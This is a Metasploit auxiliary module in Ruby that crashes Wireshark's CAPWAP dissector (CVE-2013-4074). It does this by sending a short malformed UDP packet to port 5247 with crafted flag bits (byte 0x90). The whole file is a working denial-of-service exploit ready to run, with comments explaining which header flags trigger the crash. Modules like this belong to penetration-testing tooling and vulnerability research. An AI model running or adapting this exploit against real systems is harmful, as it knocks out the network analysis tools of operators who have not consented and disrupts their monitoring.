#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark CAPWAP dissector DoS',
      'Description'    => %q{
          	This module inject malicious packet udp to crash wireshark. The crash is when we send 
		a incomplete packet and trigger capwap dissector. 
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'j0sm1',  # Exploit and msf module
          'Laurent Butti' # Discovery vulnerability -> "Reported: 2013-05-28 23:38 UTC by Laurent Butti"
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4074'],
        ],
      'DisclosureDate' => 'Apr 28 2014'))
      

    # Protocol capwap needs port 5247 to trigger the dissector in wireshark
    register_options([ Opt::RPORT(5247) ], self.class)

  end

  def run

    connect_udp

    # We send a packet incomplete to crash dissector
    print_status("#{rhost}:#{rport} - Trying to crash wireshark capwap dissector ...")
    # With 0x90 in this location we set to 1 the flags F and M. The others flags are sets to 0, then 
    # the dissector crash
    # You can see more information here: https://www.rfc-editor.org/rfc/rfc5415.txt
    # F = 1 ; L = 0 ; W = 0 ; M = 1 ; K = 0 ; Flags = 000
    buf = Rex::Text.rand_text(3) + "\x90" + Rex::Text.rand_text(15)
    udp_sock.put(buf)

    disconnect_udp

  end
end
